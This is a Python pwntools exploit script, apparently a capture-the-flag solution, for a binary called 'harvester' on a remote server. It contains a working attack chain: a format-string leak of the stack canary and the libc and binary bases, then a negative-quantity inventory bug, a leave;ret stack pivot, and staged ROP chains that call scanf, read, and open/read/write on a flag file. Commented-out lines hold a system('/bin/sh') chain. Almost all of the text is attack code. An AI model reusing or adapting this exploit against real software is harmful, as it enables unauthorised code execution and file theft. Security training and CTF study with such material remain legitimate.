from pwn import *

exe = './harvester'
context.binary = exe

    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled


# p = process(exe)
# libc = ELF('./libc.self')
# START_MAIN_RET_OFFSET = 0x26d0a
# POP_RDX_OFFSET = 0x00000000000cb1cd


p = remote('188.166.172.13', 32049)
libc = ELF('./libc.so.6', checksec=False)
START_MAIN_RET_OFFSET = 0x021bf7
POP_RDX_OFFSET = 0x0000000000001b96

elf = ELF(exe, checksec=False)

def leak_format(index):
    p.recvuntil('>')
    p.sendline('1') #fight
    p.recvuntil('>')
    p.sendline(f"%{index}$p")
    p.recvuntil('\n')
    result = p.recvuntil('\n')
    # if b'choice is: ' not in result:
    #     result = p.recvuntil('\n')
    data = result.split(b'choice is: ')[1]
    if index >= 10: data = data.split(b'\x1b')[0]
    else: data = data.split(b'\n')[0]
    return data

def leak_format_int(index):
    leak = leak_format(index)
    if leak == b'(nil)': return 0
    else: return int(leak.decode('latin-1'), 16)

# debug_binary_base = p.libs()[  list(p.libs().keys())[0]  ]
# debug_libc_base = p.libs()['/usr/lib/x86_64-linux-gnu/libc-2.31.so']

canary = leak_format_int(11)
log.info(f"canary = {hex(canary)}")
MAIN_RET = leak_format_int(13)
libc_leak = leak_format_int(3)
stack_address = leak_format_int(12)
log.info(f"Stack address {hex(stack_address)}")

libc_start_main_ret = leak_format_int(21)
libc.address = libc_start_main_ret - START_MAIN_RET_OFFSET

# print(f"START_MAIN_RET: {hex(libc_start_main_ret - debug_libc_base)}")

# log.info(f"Libc leak: {hex(libc_leak)}")
# LIBC_OFFSET_LEAK_FROM_BASE = 0xc5c0a
# libc.address = libc_leak - LIBC_OFFSET_LEAK_FROM_BASE


# libc_addr_rough = libc_leak - libc.sym['clock_nanosleep']
# libc.address = libc_addr_rough & 0xFFFFFFFFFFFFF000
# assert(libc.address == debug_libc_base)
log.info(f"Libc base @ {hex(libc.address)}")

elf.address = MAIN_RET - 0xeca
log.info(f"Binary base @ {hex(elf.address)}")

def inventory_drop():
    # drop -11 pies
    p.recvuntil('>')
    p.sendline('2')  # inventory
    p.recvuntil('>')
    p.sendline('y')
    p.recvuntil('>')
    p.sendline('-11')
    log.info('Inventory: dropped -11 pies')


POP_RDI = elf.address + 0x0000000000001063
LEAVE_RET = elf.address + 0x0000000000000a57
BIN_SH = next(libc.search(b'/bin/sh\x00'))
POP_RSI_R15 = elf.address + 0x0000000000001061
POP_RSI = next(libc.search(asm('pop rsi \n ret')))
# POP_RDX = next(libc.search(asm('pop rdx \n ret')))
POP_RDX = libc.address + POP_RDX_OFFSET

PCT_S = next(libc.search(b'%s\x00'))

STACK_PIVOT_OFFSET = 80

def send_payload():
    # stare and exploit
    #canary at offset 40
    # payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A'
    # # need a stack pivot!
    # stack_pivot_addr = stack_address - (STACK_PIVOT_OFFSET - (3 * 8)) # +2  -3!
    stack_pivot_addr = stack_address - STACK_PIVOT_OFFSET - 8
    
    # payload = flat({
    #     # 0: stack_address,
    #     0: POP_RDI,
    #     8: BIN_SH,
    #     # 16: stack_pivot_addr,
    #     16: libc.sym['system'],
    #     24: elf.sym['main'],
        
    #     40: canary,
    #     48: stack_pivot_addr,
    #     56: LEAVE_RET
    # })

    payload = flat({
        # 0: b'bash\x00',
        # 0: stack_pivot_addr-0x40,
        # 0: b'cat\x00',
        0: POP_RDI,
        8: PCT_S,
        16: POP_RSI,
        24: stack_pivot_addr + 48,
        32: libc.sym['scanf'],
        40: canary,
        48: stack_pivot_addr,
        56: LEAVE_RET
    })

    p.recvuntil('>')
    p.sendline('3')  # fight
    p.recvuntil('>')

    # gdb.attach(p, gdbscript=f"""
    # b * {hex(elf.address + 0xdff)}
    # c
    # """)

#    b * {hex(libc.address + 0x0007b1df)}

    #0x0007b1df

    
    # p.sendline(payload.replace(b'\x7f', b'\x16\x7f'))
    p.clean()
    p.send(payload)

    sleep(1)



    # intermediate payload just to call read? so we can avoid scanf and its spaces restriction

    SHIFT_OFFSET = random.choice([0,1])
    log.info(f"SHIFT_OFFSET={SHIFT_OFFSET}")

    interm_addr = stack_pivot_addr + 8 + 40 + (7 * 8) - SHIFT_OFFSET # fix this
    payload_read = p64(POP_RDI) + p64(0) + p64(POP_RSI) + p64(interm_addr) + p64(POP_RDX) + p64(0x100) + p64(elf.plt['read'])
    payload_read += b' ' # end scanf
    print(payload_read)

    # offset = 0xa6 - 0x60
    # gdb.attach(p, gdbscript=f"""
    # b * {hex(elf.plt['read'])}
    # b * {hex(elf.plt['read'] + offset)}
    # c
    # """)

    p.sendline(payload_read)
    sleep(1)

    #
    #   Remember to set the right POP RDX gadget for remote!
    #

    # payload2 = p64(POP_RDI) + p64(elf.address + 0x1341) + p64(libc.sym['puts']) + p64(MAIN_RET)
    fd = 3
    string_offset = interm_addr + SHIFT_OFFSET + (20*8) # fix this
    # payload2 = 
    
    # payload2 = p64(POP_RDI) + p64(elf.address + 0x1341) + p64(libc.sym['puts']) + p64(elf.sym['main'])

    flagname = random.choice([b'flag\x00', b'flag.txt\x00'])

    #this should work
    payload2 = p64(POP_RDI) + p64(string_offset) + p64(POP_RSI) + p64(0) + p64(libc.sym['open'])
    payload2 += p64(POP_RDI) + p64(fd) + p64(POP_RSI) + p64(string_offset) + p64(POP_RDX) + p64(20) + p64(libc.sym['read'])
    payload2 += p64(POP_RDI) + p64(1) + p64(POP_RSI) + p64(string_offset) + p64(POP_RDX) + p64(20) + p64(libc.sym['write'])
    payload2 += p64(elf.sym['main']) + flagname

    print(payload2)

    p.sendline(payload2)
    # p.sendline('reset')
    # p.clean()

# $rax   : 0x0               
# $rbx   : 0x0               
# $rcx   : 0x00007f8645c2ac0a  →  <clock_nanosleep+42> mov edx, eax
# $rdx   : 0x0               
# $rsp   : 0x00007ffc3ba7d738  →  0x000055ab159eaa57  →  <printstr+125> leave 
# $rbp   : 0x00007ffc3ba7d700  →  0x6161616261616161 ("aaaabaaa"?)
# $rsi   : 0x0               
# $rdi   : 0x0               
# $rip   : 0x000055ab159eae14  →  <stare+233> ret 
# $r8    : 0xa               
# $r9    : 0x7               
# $r10   : 0x00007ffc3ba7d690  →  0x0000000000000000
# $r11   : 0x246             
# $r12   : 0x000055ab159ea8d0  →  <_start+0> xor ebp, ebp
# $r13   : 0x0               
# $r14   : 0x0               
# $r15   : 0x0               
# $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
# $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 


inventory_drop()
send_payload()

# sleep(1)

# p.interactive()
try:
    result = b' '
    while result != b'':
        result = p.recv(timeout=0.5)
        print(result)
except:
    print('DIED')

# p.sendline('cat flag.txt')
# print(p.recvall())

# while True:
#     addr = int(input(), 16)
#     stack_offset = stack_address - addr
#     print(f"Offset: {stack_offset}")

# for k in libc.sym.keys():
#     addr = libc.sym[k]
#     print(f"{hex(libc_leak - addr)} : {k}")


# gdb.attach(p, gdbscript=f"""
# x/x {hex(libc_leak)}
# """)

# print(f"MAIN_RET OFFSET: {hex(MAIN_RET - binary_base)}")

# for i in range(1,30):
#     leak = leak_format_int(i)
#     # offset = leak - debug_libc_base
#     # print(f"{i}: {hex(leak)}      {hex(offset)}")
#     print(f"{i}: {hex(leak)}")

# for k in p.libs().keys():
#     addr = p.libs()[k]
#     print(f"{k}: {hex(addr)}")
